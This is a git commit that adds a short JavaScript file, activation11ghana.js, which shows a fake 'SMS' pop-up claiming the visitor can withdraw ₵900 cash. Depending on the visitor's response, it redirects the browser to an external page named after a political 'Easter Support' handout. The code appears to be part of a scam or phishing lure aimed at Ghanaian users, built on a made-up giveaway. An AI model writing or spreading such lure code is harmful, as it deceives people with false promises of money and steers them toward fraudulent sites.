3cb94c43773d6fc3d82cafb5dca641908e374519
graantx <slicer_sizzles9k@icloud.com>
2026-04-03 22:49:14 +0100

    Create activation11ghana.js

---
+++ activation11ghana.js
@@ -0,0 +1,8 @@
+var password = 'WITHDRAW CASH'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive ₵900.  Please press OK to WITHDRAW.',
+  'WITHDRAW CASH'
+);
+if (password != 'WITHDRAW CASH') {
+  location.href = 'https://rhud.info/Mahama-Easter-Support.html';
+}
